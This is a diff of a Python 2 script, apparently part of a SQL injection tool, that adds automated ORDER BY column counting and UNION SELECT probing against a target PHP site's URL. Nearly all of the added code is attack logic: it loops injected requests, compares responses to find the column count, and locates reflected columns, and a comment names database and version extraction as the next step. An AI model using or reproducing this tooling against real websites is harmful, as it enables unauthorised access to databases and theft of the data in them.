@@ -3,20 +3,107 @@
 try:
     import src.libs as lib
     from src.Colors import TextColor
+    from injection_defines import (
+        define_order_by_command_php, 
+        define_error_order_by_php,
+        define_union_select_query_php
+    )
+
     from Config.WebConfig import (define_headerdata)
 except Exception as err:
     raise SystemExit, TextColor.RED + TextColor.BOLD + str("What happened :( something is wrong: %s" % (err)) \
                       + TextColor.WHITE
 
 class UnionBaseAttack(object):
-    def __init__(self, url, injectedChar):
+    def __init__(self, url, injectedChar, firstResponse):
         self.url = url
         self.injectedChar = injectedChar
+        self.firstResponse = firstResponse
 
-        self.StartAttack(url, injectedChar)
+        self.__StartAttack__()
 
-    def StartAttack(self, url, injectedChar):
-        response = lib.requests.get(url=url, headers=define_headerdata)
+    def __StartAttack__(self):
+        injected_method = ""
+
+        for item in define_order_by_command_php:
+            secondResponse = lib.requests.get(url=self.url + str(item), headers=define_headerdata)
+            lib.sleep(.5)
+            if secondResponse.content.find(define_error_order_by_php[0]) is not -1:
+                injected_method = item[0:10]
+                print TextColor.CVIOLET + str("\nI working on order by injection please wait until I found they columns") + TextColor.WHITE
+                columns = self.__InjectOrderNumber__(injected_method)
+                done_str = self.url + injected_method + str(columns)
+                print TextColor.CBEIGE + str("[+] Found => %d columns {%s}"%(columns, done_str)) + TextColor.WHITE
+                print TextColor.CVIOLET + str("\nNow I testing the union select query ...") + TextColor.WHITE
+                self.__UnionSelectQuery__(columns)
+                del (columns)
+                del (injected_method)
+                break
+
+    def __InjectOrderNumber__ (self, injectedMethod):
+        '''return count of columns that website has'''
+        for counter in xrange(1, 1000):
+            lib.sleep(1)
+            secondResponse = lib.requests.get(url=self.url + injectedMethod + str(counter))
+            if secondResponse.content != self.firstResponse.content:
+                return counter - 1
+
+    def __UnionSelectQuery__(self, columns):
+        list_my_injection_numbers = list()
+        for number in xrange(1, columns + 1):
+            list_my_injection_numbers.append(str(number) * 10)
+        
+        injection_string = ""
+
+        for counter in list_my_injection_numbers:
+            injection_string = injection_string + str(counter) + ","
+
+        injection_string = injection_string[0:len(injection_string) - 1]
+
+        id_number = lib.re.findall('\d', self.url)
+        new_url = lib.string.replace(self.url, id_number[0], '-' + id_number[0])
+
+        vuln_columns = list()
+        done_searching_columns = False
+        
+        '''this below code test url with (-) in and forward of number in url'''
+        for item in define_union_select_query_php:    
+            response = lib.requests.get(url=new_url + str(item + injection_string), headers=define_headerdata)
+            for numbers in list_my_injection_numbers:
+                if response.content.find(numbers) is not -1:
+                    vuln_columns.append(numbers[0:1])
+                    done_searching_columns = True
+            lib.sleep(0.5)
+            if done_searching_columns == True:
+                break
+        
+        '''this below code test raw url with no (-) in url'''
+        if done_searching_columns == False:
+            for item in define_union_select_query_php:    
+                response = lib.requests.get(url=self.url + str(item + injection_string), headers=define_headerdata)
+                for numbers in list_my_injection_numbers:
+                    if response.content.find(numbers) is not -1:
+                        vuln_columns.append(numbers[0:1])
+                        done_searching_columns = True
+                lib.sleep(0.5)
+                if done_searching_columns == True:
+                    break
+
+        print TextColor.CYELLOWBG + TextColor.RED + "[+] Found Vulnaraable columns number " + TextColor.WHITE
+        
+        str_vulns_columns = ""
+        for item in vuln_columns:
+            str_vulns_columns = str_vulns_columns + item + " "
+        str_vulns_columns = str_vulns_columns[0:len(str_vulns_columns) - 1]        
+
+        lib.sys.stdout.write("\t\t" + ("-" * (len(str_vulns_columns) + 2)) + "\n\t\t|" + str_vulns_columns)
+        lib.sys.stdout.write("|\n\t\t" + ("-" * (len(str_vulns_columns) + 2)) + "\n")
+
+        #now we have vulnarable columns in $vuln_columns
+        #todo = extract database and version 
+
+        del(list_my_injection_numbers)
+
 
 
 
